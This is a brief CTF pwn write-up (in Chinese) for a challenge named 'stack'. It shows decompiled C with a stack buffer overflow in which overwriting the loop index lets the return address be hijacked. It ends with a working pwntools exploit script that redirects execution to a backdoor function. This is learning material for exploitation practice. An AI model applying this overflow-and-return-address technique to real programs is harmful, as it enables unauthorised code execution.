## stack


***

出题人：xsh

![image-20240413224639521](C:\Users\26272\AppData\Roaming\Typora\typora-user-images\image-20240413224639521.png)

```python
__int64 vuln()
{
  int v1; // [rsp+Ch] [rbp-24h] BYREF
  char s[8]; // [rsp+10h] [rbp-20h] BYREF
  __int64 v3; // [rsp+18h] [rbp-18h]
  int i; // [rsp+2Ch] [rbp-4h]

  *(_QWORD *)s = 0LL;
  v3 = 0LL;
  i = 0;
  v1 = 0;
  printf("size: ");
  __isoc99_scanf("%d", &v1);
  printf("> ");
  for ( i = 0; i < v1; ++i )
  {
    read(0, &s[i], 1uLL);
    if ( s[i] == 10 )
      break;
  }
  puts(s);
  return 0LL;
}

```

**栈溢出漏洞，溢出可以覆盖 i 的值，所以这里需要控制好溢出时候 i 的值，直接对返回地址写后门函数**

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
p = process('./stack')
elf = ELF('./stack')

#gdb.attach(p, 'b *0x4012b1')

p.sendlineafter(b'size: ', str(0x100))
p.sendlineafter(b'> ', b'a'*0x1c + p8(0x27) + p64(0x4012EE))

p.interactive()
#pause()

```





